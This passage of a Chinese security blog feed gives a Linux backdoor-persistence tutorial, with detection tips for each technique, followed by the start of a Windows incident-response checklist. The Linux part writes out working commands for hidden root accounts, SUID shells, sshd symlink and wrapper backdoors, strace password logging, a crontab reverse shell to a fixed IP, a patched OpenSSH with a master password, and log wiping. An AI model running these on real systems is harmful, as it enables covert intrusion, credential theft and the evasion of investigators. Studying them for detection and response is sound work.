class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载解压</span><br><span class="line">wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz</span><br><span class="line">tar zxvf cymothoa-1-beta.tar.gz </span><br><span class="line"># </span><br><span class="line">cd cymothoa-1-beta &amp;&amp; make</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Linux权限维持–后门篇"><a href="#Linux权限维持–后门篇" class="headerlink" title="Linux权限维持–后门篇"></a>Linux权限维持–后门篇</h3><p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p><h4 id="1、一句话添加用户和密码"><a href="#1、一句话添加用户和密码" class="headerlink" title="1、一句话添加用户和密码"></a><strong>1、一句话添加用户和密码</strong></h4><p>添加普通用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure><p>添加root用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p>可疑用户排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure><h4 id="2、SUID-Shell"><a href="#2、SUID-Shell" class="headerlink" title="2、SUID Shell"></a><strong>2、SUID Shell</strong></h4><p>Suid shell是一种可用于以拥有者权限运行的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配合普通用户权限使用</span><br><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure><p>使用guest用户登录就可疑获取root权限。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-1.png"></p><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm /4000 </span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm /2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure><h4 id="3、ssh公私钥免密登录"><a href="#3、ssh公私钥免密登录" class="headerlink" title="3、ssh公私钥免密登录"></a><strong>3、ssh公私钥免密登录</strong></h4><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~&#x2F;.ssh&#x2F;authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>过程中按三次回车，执行结束如下图:</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-2.png"></p><p>进入&#x2F;root&#x2F;.ssh&#x2F;文件夹，查看文件夹的内容，如下所示：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-3.png"></p><p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p><p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p><h4 id="4、软连接"><a href="#4、软连接" class="headerlink" title="4、软连接"></a><strong>4、软连接</strong></h4><p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: &#x2F;etc&#x2F;pam.d&#x2F;su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p><p>在目标服务器上执行一句话后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure><p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-4.png"></p><p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-4-1.png"></p><h4 id="5、SSH-wrapper"><a href="#5、SSH-wrapper" class="headerlink" title="5、SSH wrapper"></a><strong>5、SSH wrapper</strong></h4><p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>服务端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-5.png"></p><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al /usr/sbin/sshd</span><br><span class="line"># cat /usr/sbin/sshd</span><br><span class="line">可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure><h4 id="6、strace后门"><a href="#6、strace后门" class="headerlink" title="6、strace后门"></a><strong>6、strace后门</strong></h4><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim /etc/bashrc</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span><br><span class="line"># source /root/.bashrc</span><br></pre></td></tr></table></figure><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-5-1.png"></p><p>排查技巧：使用<code>alias</code>即可发现异常。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-5-2.png"></p><h4 id="7、crontab反弹shell"><a href="#7、crontab反弹shell" class="headerlink" title="7、crontab反弹shell"></a><strong>7、crontab反弹shell</strong></h4><p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>a、创建shell脚本，例如在&#x2F;etc&#x2F;evil.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>chmod +sx /etc/evil.sh</code></p><p>b、crontab -e 设置定时任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每一分钟执行一次</span><br><span class="line">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure><p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-6.png"></p><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看可疑的定时任务列表</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><h4 id="8、openssh后门"><a href="#8、openssh后门" class="headerlink" title="8、openssh后门"></a><strong>8、openssh后门</strong></h4><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes.h</span><br><span class="line">#define ILOG &quot;/tmp/1.txt&quot;             //记录登录本机的用户名和密码</span><br><span class="line">#define OLOG &quot;/tmp/2.txt&quot;             //记录本机登录远程的用户名和密码</span><br><span class="line">#define SECRETPW &quot;123456789&quot;          //后门的密码</span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">#define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line"></span><br><span class="line">e、安装并编译</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE=/dev/null</span><br><span class="line">export HISTSIZE=0</span><br><span class="line">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure><p>排查技巧：利用strace找出ssh后门.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="9、PAM后门"><a href="#9、PAM后门" class="headerlink" title="9、PAM后门"></a><strong>9、PAM后门</strong></h4><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p><p>利用方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2、检查pam_unix.so的修改时间</span><br><span class="line">stat /lib/security/pam_unix.so      #32位</span><br><span class="line">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure><h4 id="10、rookit后门"><a href="#10、rookit后门" class="headerlink" title="10、rookit后门"></a><strong>10、rookit后门</strong></h4><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p><p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p><p>连接后的截图：</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-7.png"></p><p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;Linux-入侵排查&quot;&gt;&lt;a href=&quot;#Linux-入侵排查&quot; class=&quot;headerlink&quot; title=&quot;Linux 入侵排查&quot;&gt;&lt;/a&gt;Linux 入侵排查&lt;/h3&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="应急响应" scheme="https://heisha123.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>应急响应 windows篇</title>
    <link href="https://heisha123.github.io/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/"/>
    <id>https://heisha123.github.io/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/</id>
    <published>2025-08-03T05:15:25.000Z</published>
    <updated>2025-08-03T14:26:34.604Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><span id="more"></span><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="windows-入侵排查"><a href="#windows-入侵排查" class="headerlink" title="windows 入侵排查"></a>windows 入侵排查</h3><h4 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h4><h5 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h5><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增&#x2F;可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li><li><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803131926441.png" alt="image-20250803131926441"></li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>在注册表编辑器中，找到 “HKEY_LOCAL_MACHINE\SAM\SAM”。默认情况下，该选项内容无法查看，需右键点击 “SAM”，选择 “权限”，打开权限管理窗口。选择当前用户（通常为 administrator），将权限勾选为 “完全控制”，点击 “确定” 后关闭注册表编辑器。</p><p>再次打开注册表编辑器，定位到 “HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”。在此项下，可以看到系统中的所有用户名，包括可能存在的隐藏账号。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803132311363.png" alt="image-20250803132311363"></p><p>若出现本地账户中没有的账户，尤其是用户名后面带有 “$” 符号的，很可能就是隐藏账户。在确认为非系统用户的前提下，可进一步确认其是否为恶意账号。</p><p>正常情况下，每个账号都有唯一对应的键值（F 值）。攻击者通常会将克隆账号的 F 值修改为与管理员账号（administrator）相同，以获取管理员权限。因此，对于发现的可疑隐藏账号，查看其对应的 F 值是否和 “administrator” 对应的 F 值相同，如果相同，则可判断该账号为克隆账号。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803132645754.png" alt="image-20250803132645754"></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803132743814.png" alt="image-20250803132743814"></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803132859378.png" alt="image-20250803132859378"></p><p>b、导出 Windows 日志 – 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p><p>  需要先去事件管理器进行导出日志，然后在进行查询</p><p><code>LogParser.exe -i:EVT &quot;SELECT TimeGenerated AS LoginTime, EXTRACT_TOKEN(Strings, 5, &#39;|&#39;) AS Username FROM 1.evtx WHERE EventID = 4624&quot;</code></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803134835606.png" alt="image-20250803134835606"></p></li></ul><h5 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h5><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED </p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803135155326.png" alt="image-20250803135155326"></p></li></ul><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 – 运行 – 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。 这里我们也可以利用火绒剑，PCHunter钩子，来查看对应的进程是否有异常的网络活动等等。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">没有签名验证信息的进程</span><br><span class="line">没有描述信息的进程</span><br><span class="line">进程的属主</span><br><span class="line">进程的路径是否合法</span><br><span class="line">CPU 或内存资源占用长时间过高的进程</span><br></pre></td></tr></table></figure></li></ul><p>3、小技巧：</p><p>​a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​b、查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​c、查看进程对应的程序位置：</p><p>​任务管理器 – 选择对应进程 – 右键打开文件位置</p><p>​运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code>    这里win10可以正常使用，win11已经弃用</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803135649681.png" alt="image-20250803135649681"></p><p>​win11用户可以按照以下步骤，在 Windows 11 系统中修复该错误：</p><p>​1. 打开设置应用，跳转到系统可选功能。</p><p>​2. 点击“添加可选功能”选项旁边的“查看功能”。</p><p>​3. 在搜索框中键入 WMIC，并在结果列表中打勾。</p><p>​4. 单击“下一步”在 Windows 11 中安装 WMIC。</p><p>​d、<code>tasklist /svc</code>   进程 – PID – 服务    这里需要关注进程名，对应的服务等。</p><p>​e、查看Windows服务所对应的端口：</p><p>​%systemroot%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services（一般 %systemroot% 就是 C:\Windows 路径）</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803140535879.png" alt="image-20250803140535879"></p><h5 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h5><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。 启动目录，里面的文件会随着系统启动而运行。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803141517105.png" alt="image-20250803141517105"></p></li></ul><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803141859166.png"></p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803142307415.png" alt="image-20250803142307415"></p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows%E7%AF%87/image-20250803142526549.png" alt="image-20250803142526549"></p><p>注意服务的启动参数，还有启动类型等等</p><h5 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 